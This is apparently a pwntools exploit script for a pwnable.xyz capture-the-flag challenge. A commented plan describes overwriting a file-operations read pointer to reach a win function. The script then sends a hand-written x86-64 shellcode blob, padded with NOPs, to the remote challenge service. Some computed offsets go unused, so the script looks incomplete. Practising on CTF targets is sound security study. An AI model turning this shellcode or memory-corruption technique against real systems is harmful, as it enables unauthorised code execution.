
#### Plan
# Open two files flag1 and flag2

# Overwrite size parameter of the flag1 (so it will be greater than &flag2.ops.fops_read-&flag1.contents)

# Read value of the flag2.ops.fops_read and print it to the screen

# Calculate virtual address of win_function

# Overwrite flag2.ops.fops_read (Note: it will also overwrite other values, so be carefull)

# Read from flag2 (it should trigger win function)

# Exit safely


from pwn import *

# Pwnable.xyz Message challenge
# 100 points

context(kernel="amd64", arch="amd64", log_level="debug")



shellcode = b"\x55\x48\x89\xe5\x48\x81\xec\x00\x09\x00\x00\xbf\x01\x00\x00\x00\x48"\
b"\x8d\x34\x25\x0b\x01\x40\x00\xba\x08\x00\x00\x00\xe8\xd9\x00\x00\x00"\
b"\x48\x8d\x3c\x25\x0b\x01\x40\x00\xe8\xd4\x00\x00\x00\x48\x89\x44\x24"\
b"\x08\x48\x8d\x3c\x25\x14\x01\x40\x00\xe8\xc2\x00\x00\x00\x48\x89\xc1"\
b"\x48\xc7\x84\x24\x00\x03\x00\x00\xff\xff\xff\xff\x89\x84\x24\x18\x03"\
b"\x00\x00\x48\x8b\x7c\x24\x08\x48\x8d\xb4\x24\x00\x01\x00\x00\xba\x01"\
b"\x02\x00\x00\xe8\x8d\x00\x00\x00\x48\x8b\x7c\x24\x08\x48\x8d\xb4\x24"\
b"\x00\x01\x00\x00\xba\x07\x02\x00\x00\xe8\x76\x00\x00\x00\x48\x8b\x7c"\
b"\x24\x08\x48\x8d\xb4\x24\x00\x01\x00\x00\xba\x5c\x04\x00\x00\xe8\x57"\
b"\x00\x00\x00\x48\xc7\x84\x24\x00\x03\x00\x00\xff\xff\xff\xff\x89\x8c"\
b"\x24\x18\x03\x00\x00\x48\x8b\x94\x24\x48\x05\x00\x00\x48\x81\xea\x1b"\
b"\x01\x00\x00\x48\x89\x94\x24\x48\x05\x00\x00\x48\x8b\x7c\x24\x08\x48"\
b"\x8d\xb4\x24\x00\x01\x00\x00\xba\x5c\x04\x00\x00\xe8\x1e\x00\x00\x00"\
b"\x48\x89\xcf\x48\x8d\xb4\x24\x00\x01\x00\x00\xba\x08\x02\x00\x00\xe8"\
b"\x01\x00\x00\x00\xc3\xb8\x00\x00\x00\x00\x0f\x05\xc3\xb8\x01\x00\x00"\
b"\x00\x0f\x05\xc3\xb8\x02\x00\x00\x00\x0f\x05\xc3\x2e\x2f\x66\x6c\x61"\
b"\x67\x31\x5c\x30\x2e\x2f\x66\x6c\x61\x67\x32\x5c\x30";





def main():
	e = ELF("challenge")
	env = dict(os.environ)
	env["LD_PRELOAD"] = "./libunicorn.so.1"
	if 0:
		p = process(e.path, env=env)
		gdb.attach(p, gdbscript="b win\nb do_read")
		sleep(2)
	elif 0:
		p = process(["strace", "-o", "strace.out", e.path])
	else:
		p = remote("svc.pwnable.xyz", 30044)

	win_off = e.symbols["win"]
	fops_read_off = e.symbols["file_read"]

	p.sendafter(b"\n", b"n\n")
	p.sendafter(b"\n", shellcode.ljust(0xFFF+1, b"\x90"))
	p.recvrepeat()


main()